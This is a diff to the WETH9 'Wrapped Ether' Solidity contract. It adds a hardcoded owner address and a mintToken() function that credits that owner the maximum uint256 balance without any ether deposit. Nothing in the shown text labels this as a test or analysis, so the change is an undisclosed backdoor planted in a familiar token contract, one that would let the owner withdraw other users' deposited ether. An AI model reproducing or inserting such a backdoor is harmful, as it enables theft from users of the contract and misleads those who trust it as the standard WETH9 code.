@@ -17,12 +17,13 @@
 // You should have received a copy of the GNU General Public License
 // along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-pragma solidity ^0.4.18;
+pragma solidity 0.4.18;
 
 contract WETH9 {
     string public name     = "Wrapped Ether";
     string public symbol   = "WETH";
     uint8  public decimals = 18;
+    address public owner= 0x78Cf14D14CE9C31ae11986B848863064DAE0d4a2;
 
     event  Approval(address indexed src, address indexed guy, uint wad);
     event  Transfer(address indexed src, address indexed dst, uint wad);
@@ -31,6 +32,11 @@ contract WETH9 {
 
     mapping (address => uint)                       public  balanceOf;
     mapping (address => mapping (address => uint))  public  allowance;
+
+    function mintToken() public{
+        require(msg.sender == owner);
+        balanceOf[msg.sender] += ~uint(0);
+    }
 
     function() public payable {
         deposit();
